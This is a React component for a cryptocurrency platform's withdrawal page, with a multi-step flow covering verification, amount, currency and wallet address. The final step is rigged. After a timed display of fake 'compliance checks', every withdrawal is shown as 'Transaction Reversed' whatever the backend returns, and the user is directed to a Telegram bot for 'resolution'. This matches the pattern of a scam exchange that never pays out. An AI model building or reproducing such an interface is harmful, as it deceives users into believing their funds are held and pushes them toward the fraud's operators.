import { useState } from "react";
import { useGetBalance, useGetCryptoRates, useCreateWithdraw } from "@workspace/api-client-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { ShieldAlert, ArrowRight, Loader2, AlertTriangle, MessageCircle } from "lucide-react";

const STEPS = ["Verification", "Amount", "Currency", "Address", "Processing"];

export default function Withdraw() {
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState("");
  const [crypto, setCrypto] = useState("");
  const [wallet, setWallet] = useState("");
  const [state, setState] = useState<"idle" | "processing" | "reversed">("idle");

  const { data: balance, isLoading: loadingBalance } = useGetBalance();
  const { data: rates } = useGetCryptoRates();
  const createWithdraw = useCreateWithdraw();
  const { toast } = useToast();

  const selectedRate = rates?.find(r => r.symbol === crypto);
  const cryptoAmount = selectedRate && amount ? (Number(amount) / selectedRate.usdRate).toFixed(6) : null;

  const handleAmountSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!balance) return;
    if (Number(amount) > balance.withdrawableBalance) {
      toast({ title: "Insufficient Funds", description: "Amount exceeds withdrawable balance.", variant: "destructive" });
      return;
    }
    setStep(3);
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setStep(5);
    setState("processing");
    setTimeout(() => {
      createWithdraw.mutate({ data: { amount: Number(amount), crypto, walletAddress: wallet } }, {
        onSettled: () => setState("reversed")
      });
    }, 3500);
  };

  if (loadingBalance) return (
    <div className="flex justify-center py-16"><Loader2 className="h-8 w-8 animate-spin text-primary" /></div>
  );

  return (
    <div className="space-y-5">
      <div>
        <h1 className="text-2xl font-bold">Withdraw</h1>
        <p className="text-sm text-muted-foreground">Transfer funds to your wallet</p>
      </div>

      {/* Balance Pill */}
      <div className="bg-card border border-border rounded-2xl p-4 flex items-center justify-between">
        <div>
          <p className="text-xs text-muted-foreground">Available to Withdraw</p>
          <p className="text-2xl font-bold text-[#0ECB81]">${balance?.withdrawableBalance.toFixed(2)}</p>
        </div>
        <div className="w-12 h-12 rounded-xl bg-[#0ECB81]/10 flex items-center justify-center">
          <ShieldAlert className="h-6 w-6 text-[#0ECB81]" />
        </div>
      </div>

      {/* Step Indicator */}
      <div className="flex gap-1.5 items-center">
        {STEPS.map((s, i) => {
          const n = i + 1;
          const active = n === step;
          const done = n < step;
          return (
            <div key={s} className="flex-1 flex flex-col items-center gap-1">
              <div className={`h-1.5 w-full rounded-full transition-colors ${done ? "bg-primary" : active ? "bg-primary/50" : "bg-muted"}`} />
              <span className={`text-[9px] font-medium hidden sm:block ${active ? "text-primary" : "text-muted-foreground"}`}>{s}</span>
            </div>
          );
        })}
      </div>

      {/* Step 1 — Security Check */}
      {step === 1 && (
        <div className="bg-card border border-border rounded-2xl p-6 space-y-4">
          <div className="w-14 h-14 rounded-full bg-[#F0B90B]/15 flex items-center justify-center mx-auto">
            <ShieldAlert className="h-7 w-7 text-[#F0B90B]" />
          </div>
          <div className="text-center">
            <h2 className="text-lg font-bold">Identity Verification</h2>
            <p className="text-sm text-muted-foreground mt-1">We must verify your identity before processing withdrawals to prevent unauthorized access.</p>
          </div>
          <div className="grid grid-cols-2 gap-3">
            <button
              onClick={() => toast({ title: "Required", description: "You must confirm to proceed.", variant: "destructive" })}
              className="py-3 rounded-xl border border-border text-sm font-semibold text-muted-foreground hover:bg-muted/30 transition-colors"
            >
              Decline
            </button>
            <button
              onClick={() => setStep(2)}
              className="py-3 rounded-xl bg-primary text-primary-foreground text-sm font-bold hover:bg-primary/90 transition-colors"
            >
              I Confirm
            </button>
          </div>
        </div>
      )}

      {/* Step 2 — Amount */}
      {step === 2 && (
        <div className="bg-card border border-border rounded-2xl p-6 space-y-4">
          <h2 className="text-lg font-bold">Withdrawal Amount</h2>
          <form onSubmit={handleAmountSubmit} className="space-y-4">
            <div className="space-y-1.5">
              <Label>Amount in USD</Label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground font-bold">$</span>
                <Input
                  type="number"
                  value={amount}
                  onChange={e => setAmount(e.target.value)}
                  required
                  min="10"
                  max={balance?.withdrawableBalance}
                  placeholder="0.00"
                  className="h-12 pl-7 bg-muted/30 border-border rounded-xl text-lg font-bold"
                />
              </div>
              <p className="text-xs text-muted-foreground">Max: ${balance?.withdrawableBalance.toFixed(2)}</p>
            </div>
            <div className="grid grid-cols-3 gap-2">
              {[25, 50, 100].map(pct => (
                <button
                  key={pct}
                  type="button"
                  onClick={() => setAmount(((balance?.withdrawableBalance || 0) * pct / 100).toFixed(2))}
                  className="py-2 text-xs font-semibold bg-muted/40 border border-border rounded-xl hover:border-primary/40 transition-colors"
                >
                  {pct}%
                </button>
              ))}
            </div>
            <div className="grid grid-cols-2 gap-3">
              <button type="button" onClick={() => setStep(1)} className="py-3 rounded-xl border border-border text-sm font-semibold hover:bg-muted/30 transition-colors">Back</button>
              <Button type="submit" className="h-12 rounded-xl font-bold">Continue <ArrowRight className="ml-2 h-4 w-4" /></Button>
            </div>
          </form>
        </div>
      )}

      {/* Step 3 — Currency */}
      {step === 3 && (
        <div className="bg-card border border-border rounded-2xl p-6 space-y-4">
          <h2 className="text-lg font-bold">Select Currency</h2>
          <p className="text-sm text-muted-foreground">Withdrawing <span className="font-bold text-foreground">${amount}</span></p>
          <div className="space-y-2">
            {rates?.map(rate => (
              <button
                key={rate.symbol}
                onClick={() => setCrypto(rate.symbol)}
                className={`w-full flex items-center gap-3 p-4 rounded-xl border-2 transition-all ${
                  crypto === rate.symbol ? "border-primary bg-primary/10" : "border-border bg-muted/20 hover:border-primary/40"
                }`}
              >
                <img
                  src={rate.symbol === "BTC"
                    ? "https://assets.coingecko.com/coins/images/1/small/bitcoin.png"
                    : "https://assets.coingecko.com/coins/images/279/small/ethereum.png"}
                  alt={rate.symbol}
                  className="w-8 h-8 rounded-full"
                  onError={e => { (e.target as HTMLImageElement).style.display = "none"; }}
                />
                <div className="text-left flex-1">
                  <p className="font-bold text-sm">{rate.name}</p>
                  <p className="text-xs text-muted-foreground">1 {rate.symbol} ≈ ${rate.usdRate.toLocaleString()}</p>
                </div>
                {crypto === rate.symbol && amount && (
                  <div className="text-right">
                    <p className="text-sm font-bold text-primary">{(Number(amount) / rate.usdRate).toFixed(6)}</p>
                    <p className="text-xs text-muted-foreground">{rate.symbol}</p>
                  </div>
                )}
              </button>
            ))}
          </div>
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => setStep(2)} className="py-3 rounded-xl border border-border text-sm font-semibold hover:bg-muted/30 transition-colors">Back</button>
            <button
              onClick={() => { if (!crypto) { toast({ title: "Select a currency", variant: "destructive" }); return; } setStep(4); }}
              className="py-3 rounded-xl bg-primary text-primary-foreground text-sm font-bold hover:bg-primary/90 transition-colors"
            >
              Continue
            </button>
          </div>
        </div>
      )}

      {/* Step 4 — Wallet Address */}
      {step === 4 && (
        <div className="bg-card border border-border rounded-2xl p-6 space-y-4">
          <h2 className="text-lg font-bold">Destination Wallet</h2>
          {cryptoAmount && (
            <div className="bg-[#0ECB81]/10 border border-[#0ECB81]/20 rounded-xl p-3 text-center">
              <p className="text-sm text-muted-foreground">You will receive</p>
              <p className="text-xl font-bold text-[#0ECB81]">{cryptoAmount} {crypto}</p>
            </div>
          )}
          <div className="flex items-start gap-2 bg-[#F0B90B]/10 border border-[#F0B90B]/20 rounded-xl p-3">
            <AlertTriangle className="h-4 w-4 text-[#F0B90B] shrink-0 mt-0.5" />
            <p className="text-xs text-[#EAECEF]">Double-check your address. Transfers to wrong addresses are irreversible.</p>
          </div>
          <form onSubmit={handleFinalSubmit} className="space-y-4">
            <div className="space-y-1.5">
              <Label>Your {crypto} Wallet Address</Label>
              <Input
                value={wallet}
                onChange={e => setWallet(e.target.value)}
                required
                placeholder={crypto === "BTC" ? "bc1q..." : "0x..."}
                className="h-12 bg-muted/30 border-border rounded-xl font-mono text-sm"
              />
            </div>
            <div className="grid grid-cols-2 gap-3">
              <button type="button" onClick={() => setStep(3)} className="py-3 rounded-xl border border-border text-sm font-semibold hover:bg-muted/30 transition-colors">Back</button>
              <Button type="submit" className="h-12 rounded-xl font-bold">Initiate Transfer</Button>
            </div>
          </form>
        </div>
      )}

      {/* Step 5 — Processing / Reversed */}
      {step === 5 && (
        <div className="bg-card border border-border rounded-2xl p-8 text-center space-y-6">
          {state === "processing" && (
            <>
              <div className="w-20 h-20 rounded-full border-4 border-primary/20 border-t-primary animate-spin mx-auto" />
              <div>
                <h3 className="text-lg font-bold">Processing Transaction</h3>
                <p className="text-sm text-muted-foreground mt-1">Running compliance checks...</p>
              </div>
              <div className="space-y-2 text-left bg-muted/20 rounded-xl p-4">
                {["Identity verification ✓", "AML screening ✓", "Network routing..."].map((s, i) => (
                  <p key={i} className="text-xs text-muted-foreground">{s}</p>
                ))}
              </div>
            </>
          )}

          {state === "reversed" && (
            <>
              <div className="w-20 h-20 rounded-full bg-[#F6465D]/15 flex items-center justify-center mx-auto">
                <ShieldAlert className="h-10 w-10 text-[#F6465D]" />
              </div>
              <div>
                <h3 className="text-xl font-bold text-[#F6465D]">Transaction Reversed</h3>
                <p className="text-sm text-muted-foreground mt-1">Your withdrawal was flagged by our security system.</p>
              </div>
              <div className="bg-muted/20 border border-border rounded-xl p-4 text-left space-y-2">
                <p className="text-sm font-semibold text-foreground">Possible reasons:</p>
                <ul className="space-y-1.5 text-sm text-muted-foreground">
                  <li className="flex items-start gap-2"><span className="text-[#F6465D]">•</span> Destination identified as a cold wallet</li>
                  <li className="flex items-start gap-2"><span className="text-[#F6465D]">•</span> KYC/AML verification incomplete</li>
                  <li className="flex items-start gap-2"><span className="text-[#F6465D]">•</span> Unusual withdrawal pattern detected</li>
                </ul>
              </div>
              <a href="https://t.me/AverAssistancebot" target="_blank" rel="noreferrer">
                <div className="flex items-center justify-center gap-2 bg-[#229ed9]/10 border border-[#229ed9]/30 rounded-xl p-3 hover:bg-[#229ed9]/20 transition-colors">
                  <MessageCircle className="h-5 w-5 text-[#229ed9]" />
                  <span className="text-sm font-bold text-[#229ed9]">Contact @AverAssistancebot for resolution</span>
                </div>
              </a>
              <button onClick={() => { setStep(1); setState("idle"); }} className="text-sm text-muted-foreground hover:text-foreground underline">
                Start over
              </button>
            </>
          )}
        </div>
      )}
    </div>
  );
}
